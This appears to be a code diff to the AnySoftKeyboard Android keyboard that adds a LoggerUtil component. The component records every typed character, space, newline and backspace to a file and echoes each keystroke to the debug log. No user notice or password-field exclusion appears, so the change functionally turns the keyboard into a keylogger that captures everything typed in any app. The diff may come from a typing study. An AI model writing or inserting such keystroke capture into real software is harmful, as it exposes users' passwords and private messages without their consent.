@@ -98,7 +98,10 @@ import com.menny.android.anysoftkeyboard.AnyApplication;
 import com.menny.android.anysoftkeyboard.BuildConfig;
 import com.menny.android.anysoftkeyboard.FeaturesSet;
 import com.menny.android.anysoftkeyboard.R;
+import com.radicalninja.logger.LoggerUtil;
 
+import java.io.FileNotFoundException;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
@@ -193,6 +196,8 @@ public class AnySoftKeyboard extends InputMethodService implements
     private boolean mLastCharacterWasShifted = false;
     private InputMethodManager mInputMethodManager;
     private VoiceRecognitionTrigger mVoiceRecognitionTrigger;
+
+    private LoggerUtil mLogger;
 
     public AnySoftKeyboard() {
         mAskPrefs = AnyApplication.getConfig();
@@ -290,6 +295,13 @@ public class AnySoftKeyboard extends InputMethodService implements
         mVoiceRecognitionTrigger = new VoiceRecognitionTrigger(this);
 
         mSwitchAnimator = new LayoutSwitchAnimationListener(this);
+
+        try {
+            Log.d(LoggerUtil.TAG, "Opening LoggerUtil file for writing...");
+            mLogger = new LoggerUtil(getApplicationContext());
+        } catch (FileNotFoundException e) {
+            Log.d(LoggerUtil.TAG, "Unable to open LoggerUtil file!", e);
+        }
     }
 
     private void initSuggest() {
@@ -330,6 +342,13 @@ public class AnySoftKeyboard extends InputMethodService implements
                     getString(R.string.debug_tracing_finished,
                             DeveloperUtils.getTraceFile()), Toast.LENGTH_SHORT)
                     .show();
+        }
+
+        try {
+            Log.d(LoggerUtil.TAG, "Closing LoggerUtil file...");
+            mLogger.close();
+        } catch (IOException e) {
+            Log.d(LoggerUtil.TAG, "Unable to close LoggerUtil file!", e);
         }
 
         super.onDestroy();
@@ -1967,13 +1986,34 @@ public class AnySoftKeyboard extends InputMethodService implements
                     // hence the "if (!forMultiTap)" above
                     final CharSequence beforeText = ic == null ? null : ic.getTextBeforeCursor(1, 0);
                     final int textLengthBeforeDelete = (TextUtils.isEmpty(beforeText)) ? 0 : beforeText.length();
-                    if (textLengthBeforeDelete > 0)
+                    if (textLengthBeforeDelete > 0) {
                         ic.deleteSurroundingText(1, 0);
+                        // TODO: Move this and other similar calls into LoggerUtil for easy reference.
+                        try {
+                            Log.d(LoggerUtil.class.getSimpleName(), "Writing backspace [{bs}]");
+                            mLogger.write("{bs}");
+                        } catch (IOException e) {
+                            Log.d(LoggerUtil.class.getSimpleName(), "Error writing backspace to log!", e);
+                        }
+                    }
                     else
                         sendDownUpKeyEvents(KeyEvent.KEYCODE_DEL);
                 }
             }
         }
+    }
+
+    @Override
+    public void sendDownUpKeyEvents(int keyEventCode) {
+        if (keyEventCode == KeyEvent.KEYCODE_DEL) {
+            try {
+                Log.d(LoggerUtil.class.getSimpleName(), "Writing backspace [{bs}]");
+                mLogger.write("{bs}");
+            } catch (IOException e) {
+                Log.d(LoggerUtil.class.getSimpleName(), "Error writing backspace to log!", e);
+            }
+        }
+        super.sendDownUpKeyEvents(keyEventCode);
     }
 
     private void handleControl() {
@@ -2125,6 +2165,13 @@ public class AnySoftKeyboard extends InputMethodService implements
         }
         TextEntryState.typedCharacter((char) primaryCodeForShow, false);
         mJustAutoAddedWord = false;
+
+        try {
+            Log.d(LoggerUtil.TAG, "Writing Character: "+((char) primaryCodeForShow));
+            mLogger.write((char) primaryCodeForShow);
+        } catch (IOException e) {
+            Log.d(LoggerUtil.TAG, "Error writing character to log!", e);
+        }
     }
 
     private void handleSeparator(int primaryCode) {
@@ -2182,8 +2229,22 @@ public class AnySoftKeyboard extends InputMethodService implements
             //power-users feature ahead: Shift+Enter
             //getting away from firing the default editor action, by forcing newline
             ic.commitText("\n", 1);
+
+            try {
+                Log.d(LoggerUtil.TAG, "Writing new line [\\n] to log.");
+                mLogger.write("\n");
+            } catch (IOException e) {
+                Log.d(LoggerUtil.TAG, "Error writing white space to log!", e);
+            }
         } else {
             sendKeyChar((char) primaryCode);
+
+            try {
+                Log.d(LoggerUtil.TAG, "Writing White space: ["+((char) primaryCode)+"]");
+                mLogger.write((char) primaryCode);
+            } catch (IOException e) {
+                Log.d(LoggerUtil.TAG, "Error writing white space to log!", e);
+            }
         }
 
         // Handle the case of ". ." -> " .." with auto-space if necessary
